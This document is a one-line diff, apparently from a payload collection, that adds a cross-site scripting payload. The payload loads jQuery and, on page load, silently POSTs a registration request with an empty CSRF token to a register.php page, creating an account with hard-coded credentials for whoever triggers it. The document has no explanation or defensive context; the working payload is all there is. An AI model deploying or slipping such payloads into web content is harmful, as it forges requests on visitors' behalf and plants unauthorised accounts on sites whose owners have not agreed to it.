@@ -1,0 +1,1 @@
+<script%20src="http://code.jquery.com/jquery-1.9.1.js"></script><script>$(document).ready(function(){$.ajax({type:"POST",url:"index.php?page=register.php",data:{"csrf-token":"","username":"Emreeeee","password":"Emreeeee","confirm_password":"Emreeeee","my_signature":"Emreeeee","register-php-submit-button":"Create+Account"},});});</script>
